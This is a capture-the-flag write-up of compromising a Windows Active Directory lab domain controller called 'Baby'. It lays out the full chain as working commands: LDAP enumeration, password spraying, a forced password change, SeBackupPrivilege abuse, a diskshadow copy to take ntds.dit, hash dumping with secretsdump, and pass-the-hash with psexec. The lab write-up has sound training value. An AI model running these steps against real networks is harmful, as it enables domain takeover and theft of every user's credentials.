
## CTF Writeup: Baby

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.234.71
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 14:02 -0500
Nmap scan report for 10.129.234.71
Host is up (0.049s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50556/tcp open  unknown
50568/tcp open  unknown
56183/tcp open  unknown
56184/tcp open  unknown
60874/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 184.43 seconds
```

An more detailled scan exposed detailled information about the running services.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49668,50556,50568,56183,56184,60784 10.129.234.71  
Host is up (0.044s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-30 19:07:49Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-06-29T19:01:13
|_Not valid after:  2026-12-29T19:01:13
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-30T19:08:41+00:00
|_ssl-date: 2026-06-30T19:09:20+00:00; -2s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
50556/tcp open     msrpc         Microsoft Windows RPC
50568/tcp open     msrpc         Microsoft Windows RPC
56183/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
56184/tcp open     msrpc         Microsoft Windows RPC
60784/tcp filtered unknown
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-30T19:08:41
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.45 seconds
```

Judging from the nmap scan we can see that the target system is probably the DC. Since Kerberos Auth is running & LDAP seems to be active aswell. We enumerated the name of the domain, the hostname of the target system and the DNS Entry for the target system. Let's map them to the target ip in our local dns file.

```
echo "10.129.234.71 baby.vl BabyDC.bay.vl BABYDC" | tee -a /etc/hosts
```

I enumerated LDAP Entries manually and without authentication and saved the output in an .txt file on my local machine.

```
ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" > ldapsearch.txt
```

Since in a lot of CTF's passwords are getting stored in "description" fields of the users. I grep'd for it and found credentials.

```
cat ldapsearch.txt | grep description
description: Set initial password to BabyStart123!
```

```
Teresa.Bell:BabyStart123!
```

I then utilized the following command in order to view all users.

```
cat ldapsearch.txt | grep dn
```

Formatted the output properly and saved it in an users.txt file. 

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower($1) "." tolower($2)}' | sort -u > users.txt
```

I tried to authenticate by spraying usernames and 

```
nxc smb baby.vl -u users.txt -p passwords.txt --rid-brute
```

the output provided me the information that users "caroline.robinson" password must be changed.

nxc has an in-built module which allows us to change the password of an user. I utilized this module to change the password.

```
nxc smb baby.vl -u caroline.robinson -p passwords.txt -M change-password -o NEWPASS=Warrior32
```

Our new credentials should be:

```
caroline.robinson:Warrior32
```

Upon spraying winrm we get the information provided that we Pwned it. 

```
nxc winrm baby.vl -u caroline.robinson -p Warrior32
```

Let's connect using the credentials and evil-winrm!

```
evil-winrm -i baby.vl -u caroline.robinson -p Warrior32
```

Retrieved user.txt in C:\Users\Caroline.Robinson\Desktop.

```
47984584754482fa402105f8112e9daf
```
## Privilege Escalation

The first thing  did was enumerating which groups & privileges our current session has. It seems to be part of the Backup Operators Group & an non-default Group named "it".

We also got the privileges set for "SeBackupPrivilege" which is rather interesting.

I decided to abuse the SeBackupPrivilege which allows me to extract the SAM & SYSTEM File out of the registry.

```
reg save hklm\sam C:\Temp\SAM
```

```
reg save hklm\system C:\Temp\SYSTEM
```

I utilized the in-built function of evil-winrm to download them.

```
download SAM
```

```
download SYSTEM
```

I then decided to dump the files to retrieve the NTLM Hashes of all users.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

But trying to connect via psexec or wmiexec didn't work. After some research I found that this isn't the intended way. I need to get Domain Hashes. I can only get them by getting access to the so called NTDS.dit file. Since this file is getting used by the AD itself all the time, it can't be extracted.  We need to create a so called "shadow copy". The extraction o the domain hashes also requires the SYSTEM hive, which I already retrieved.

This template creates an snapshot or shadow copy of the C:\ Drive and exports it into an E:\ Drive. We can then view the NTDS.dit file in there and download it onto our local machine.

Saved this content into an script.txt file on the local machine.

```
set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:
```

Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.

```
unix2dos script.txt
```

We can now upload the script to the target.

```
upload script.txt
```

I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.

```
diskshadow /s script.txt
```

We can confirm if it worked.

```
dir E:\
```

To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.

```
robocopy /b E:\Windows\ntds . ntds.dit
```

This ensures that the Active Directory Database File is in our current Drive & Directory.

I then downloaded the file to my local machine.

```
download ntds.dit
```

Utilized secretsdump.py in order to dump all domain hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
```

I then utilized "psexec" to connect to the DC.

```
impacket-psexec Administrator@baby.vl -hashes aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
382bbecced9fc61094678771d05540da
```
